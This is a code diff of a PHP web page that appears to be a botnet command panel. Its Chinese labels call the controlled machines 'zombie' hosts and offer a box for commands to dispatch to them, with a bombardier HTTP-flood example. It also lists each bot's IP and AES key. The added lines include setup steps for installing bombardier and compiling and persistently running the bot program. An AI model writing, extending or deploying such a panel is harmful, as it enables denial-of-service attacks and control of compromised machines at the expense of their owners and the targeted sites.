@@ -138,7 +138,7 @@ $result = mysqli_query($conn, $sql);
     <label class="form-label fw-bold">請輸入你要下發至每隻肉雞的指令</label>
 
     <textarea id="devCmd" class="form-control font-mono" rows="4"
-        placeholder="例如：bombardier -c 500 -d 10s https://example.com/"></textarea>
+        placeholder="例如：bombardier -c 500 -d 10s https://example.com/" >ping 1.1.1.1 -c 6</textarea>
 
     <button id="devSubmit" class="btn btn-warning mt-3 px-4 fw-bold">
         <i class="bi bi-terminal-dash me-1"></i> 發送指令
@@ -218,7 +218,9 @@ if ($result && mysqli_num_rows($result) > 0) {
         $ip  = binaryToIPv4($row['ip']);
         $key = bin2hex($row['aes_key']);
         $time = $row['last_alive_time'];
-
+if ($time === NULL) {
+    $time = "1999-01-01 00:00:00";
+}
         $bot_js[] = "{ ip: '$ip', key: '$key' }";
 
 $status_id = str_replace('.', '-', $ip);
@@ -298,6 +300,23 @@ window.addEventListener("DOMContentLoaded", function () {
 肉雞5分鐘內無響應心跳包會被判斷為離線。<br>指令只會對活躍肉雞下發。
     </div>
 </div>
+<pre id="attack-log" class="p-3 bg-dark text-white rounded mb-4" >
+安裝編譯套件和screen：
+apt update -y
+apt install gcc  screen  openssl libssl-dev -y
+
+安裝bombardier ：
+wget https://github.com/codesenberg/bombardier/releases/latest/download/bombardier-linux-amd64
+chmod +x bombardier-linux-amd64
+sudo mv bombardier-linux-amd64 /usr/local/bin/bombardier
+
+上傳受控程式並編譯
+gcc rj_x.x.x.x.c -lcrypto -lssl -o rj
+
+使用screen保持運行
+screen -S rj
+screen -r rj
+</pre>
 
 </div>
 </div>
